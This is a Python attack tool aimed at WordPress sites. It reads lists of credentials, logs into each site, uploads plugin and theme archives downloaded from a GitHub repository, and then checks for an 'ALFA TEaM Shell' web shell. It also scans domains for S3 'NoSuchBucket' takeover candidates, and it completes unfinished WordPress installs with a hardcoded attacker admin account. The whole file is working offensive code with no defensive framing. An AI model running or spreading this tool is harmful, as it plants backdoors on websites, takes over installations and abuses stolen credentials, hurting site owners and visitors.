try:
	import requests as r, os, re, sys
	from bs4 import BeautifulSoup as par
	from concurrent.futures import ThreadPoolExecutor as pol
	from time import sleep
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	r.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception as e:
	exit("error: "+str(e))


clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"user-agent": "chrome", "User-Agent": "chrome"}


def downloader():
	# Download plugins
	plugs = r.get("https://raw.githubusercontent.com/hekelpro/myschools/refs/heads/main/zip/coco.zip").content
	with open("alat/coco.zip", "wb") as sv:
		sv.write(plugs)
	# Download Themes
	theme = r.get("https://raw.githubusercontent.com/hekelpro/myschools/refs/heads/main/zip/theme.zip").content
	with open("alat/theme.zip", "wb") as sv:
		sv.write(theme)
	return True

def write(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def login_wp(target):
	url, u, p = re.findall("(https?://.*?):(.*?):(.*)", target)[0]
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]

	ses = r.Session()
	ses.headers.update({"user-agent": "chrome"})
	try:
		cek = par(ses.get(url+"/wp-login.php", timeout=10).text, "html.parser")
		if "captcha" in str(cek):
			print("  -> captcha: "+url)
		else:
			forms = cek.find("form", {"method": "post"})
			payload = {}
			for inp in forms.find_all("input"):
				payload.update({inp.get("name"): inp.get("value")})
			payload.update({"log": u, "pwd": p})
			if forms.get("action") is None:
				usl = url + "/wp-login.php"
			else:
				usl = forms.get("action")
			submit = ses.post(usl, data=payload, allow_redirects=True).text
			kuki = ses.cookies.get_dict()
			if "confirm_admin_email" in str(submit):
				acon = par(submit, "html.parser").find("div", {"class": "admin-email__actions-secondary"})
				confirm = acon.find("a").get("href")
				ses.get(confirm, cookies=kuki, allow_redirects=True).text
				write("wp_valid.txt", url+"/wp-login.php#"+u+"@"+p)

				# uploader plugin
				methods = ["plugin","theme"]
				for gas in methods:
					if gas == "plugin":
						pars = par(ses.get(url+"/wp-admin/plugin-install.php", cookies=kuki).text, "html.parser")
						form = pars.find("form", {"enctype": "multipart/form-data"})
						if form:
							payload = {
								x.get("name"): x.get("value")
								for x in form.findAll("input", {"type": ["hidden", "submit"]})
							}
							file = {"pluginzip": ("coco.zip",open("alat/coco.zip","rb"),"multipart/form-data")}
							ses.post(form.get("action"), data=payload, files=file, cookies=kuki).text
					elif gas == "theme":
						pars = par(ses.get(url+"/wp-admin/theme-install.php?browse=popular", cookies=kuki).text, "html.parser")
						form = pars.find("form", {"enctype": "multipart/form-data"})
						if form:
							payload = {
								x.get("name"): x.get("value")
								for x in form.findAll("input", {"type": ["hidden", "submit"]})
							}
							file = {"themezip": ("theme.zip",open("alat/theme.zip","rb"),"multipart/form-data")}
							ses.post(form.get("action"), data=payload, files=file, cookies=kuki).text
				sukses = []
				jadi = ["/wp-content/plugins/coco/includes/plug.php", "/wp-content/themes/theme/class-autoload.php"]
				for ma in jadi:
					ceks = r.get(url+ma, headers=header()).text
					ss = url+ma
					if "ALFA TEaM Shell" in ceks:
						sukses.append(ss)
					elif "<!-- GIF89;a -->" in ceks:
						sukses.append(ss)
				if len(sukses) != 0:
					write("wp_shell.txt", sukses[0])
					print("  -> success upshell: "+sukses[0])
				else:
					print("  -> failed upshell : "+url)
			elif "menu-dashboard" in str(submit) or "wpadminbar" in str(submit):
				#print("  -> success: "+url)
				write("wp_valid.txt", url+"/wp-login.php#"+u+"@"+p)

				# uploader plugin
				methods = ["plugin","theme"]
				for gas in methods:
					if gas == "plugin":
						pars = par(ses.get(url+"/wp-admin/plugin-install.php", cookies=kuki).text, "html.parser")
						form = pars.find("form", {"enctype": "multipart/form-data"})
						if form:
							payload = {
								x.get("name"): x.get("value")
								for x in form.findAll("input", {"type": ["hidden", "submit"]})
							}
							file = {"pluginzip": ("coco.zip",open("alat/coco.zip","rb"),"multipart/form-data")}
							ses.post(form.get("action"), data=payload, files=file, cookies=kuki).text
					elif gas == "theme":
						pars = par(ses.get(url+"/wp-admin/theme-install.php?browse=popular", cookies=kuki).text, "html.parser")
						form = pars.find("form", {"enctype": "multipart/form-data"})
						if form:
							payload = {
								x.get("name"): x.get("value")
								for x in form.findAll("input", {"type": ["hidden", "submit"]})
							}
							file = {"themezip": ("theme.zip",open("alat/theme.zip","rb"),"multipart/form-data")}
							ses.post(form.get("action"), data=payload, files=file, cookies=kuki).text
				sukses = []
				jadi = ["/wp-content/plugins/coco/includes/plug.php", "/wp-content/themes/theme/class-autoload.php"]
				for ma in jadi:
					ceks = r.get(url+ma, headers=header()).text
					ss = url+ma
					if "ALFA TEaM Shell" in ceks:
						sukses.append(ss)
					elif "<!-- GIF89;a -->" in ceks:
						sukses.append(ss)
				if len(sukses) != 0:
					write("wp_shell.txt", sukses[0])
					print("  -> success upshell: "+sukses[0])
				else:
					print("  -> failed upshell : "+url)
			else:
				print("  -> failed : "+url)
	except:
		print("  -> invalid: "+url)

def cek_domain(url):
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	try:
		cek = r.get(url, headers=header()).text
		if "NoSuchBucket" in cek:
			print("  -> VALID: "+url)
			write("nosuchbucket.txt", url)
		else:
			print("  -> INVALID: "+url)
	except Exception as ex:
		print("  -> error: "+str(ex))

def wpinstall(domain):
	urk = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	DIR = [
		"/wp",
		"/wordpress",
		"/WordPress",
		"/WP",
		"/new",
		"/old",
		"/",
	]
	for yoy in DIR:
		url = urk + yoy
		try:
			cek = r.get(url + "/wp-admin/install.php", allow_redirects=True, headers=header(), verify=False, timeout=10).text
			if "admin_password" in str(cek) or "language-continue" in str(cek) or "weblog_title" in str(cek) or "install.php?step=2" in str(cek) or 'action="?step=0"' in str(cek):
				data = {
					"weblog_title": "admin",
					"user_name": "rizkydev",
					"language": "", "blog_public": "0",
					"admin_password2": "123madefaka",
					"admin_password": "123madefaka",
					"admin_email": "lawlietindo15@gmail.com",
					"Submit": "Install WordPress"
				}
				posted = r.post(url + "/wp-admin/install.php?step=2", data=data, headers=header(), verify=False, allow_redirects=True).text
				if "/wp-login.php" in posted:
					write("install.txt", url+"/wp-login.php#rizkydev@123madefaka")
					print("   +> "+url+"/wp-login.php#rizkydev@123madefaka")
				else:
					write("install.txt", url+"/wp-admin/setup-config.php")
					print("   +> "+url+"/wp-admin/setup-config.php")
			else:
				print("   +> "+url)
		except:
			pass


def main():
	clear()
	print("""
	[   W E L C O M E   ]

   1. Wordpress checker + auto upshell
   2. Domain NoSuchBucket checker
   3. Wp install xploit checker
   4. Exit program
	""")
	inpus = input(">> Choose number: ")
	while inpus == "":
		inpus = input(">> Choose number: ")
	if inpus == "1":
		print("\n? Format wp: url:user:password")
		while True:
			file = input("> Masukan file: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				break
			except:
				print("-> File not found")
		print("! Processing..\n")
		with pol(max_workers=10) as sub:
			for x in cek:
				sub.submit(login_wp, x)
		exit("\n! Done, save to wp_valid.txt\n")
	elif inpus == "2":
		while True:
			file = input("> Masukan file: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				break
			except:
				print("-> File not found")
		print("! Processing..\n")
		with pol(max_workers=10) as sub:
			for x in cek:
				sub.submit(cek_domain, x)
		exit("\n! Done, save to nosuchbucket.txt\n")
	elif inpus == "3":
		while True:
			file = input("> Masukan file: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				break
			except:
				print("-> File not found")
		print("! Processing..\n")
		with pol(max_workers=10) as sub:
			for x in cek:
				sub.submit(wpinstall, x)
		exit("\n! Done, save to install.txt\n")
	elif inpus == "4":
		exit("! Exit program..\n")


if __name__=="__main__":
	if not os.path.exists("alat"):
		try:os.mkdir("alat")
		except:pass
		print("! Wait... Downloading data")
		downloader()
		sleep(0.1)
		main()
	else:
		main()
